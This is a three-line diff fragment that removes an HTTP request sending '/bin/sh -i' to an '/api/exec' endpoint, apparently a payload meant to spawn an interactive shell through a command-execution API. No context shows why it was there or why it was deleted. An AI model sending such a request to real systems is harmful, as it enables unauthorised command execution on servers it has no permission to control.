@@ -1,3 +1,0 @@
-POST /api/exec HTTP/1.1
-
-/bin/sh -i
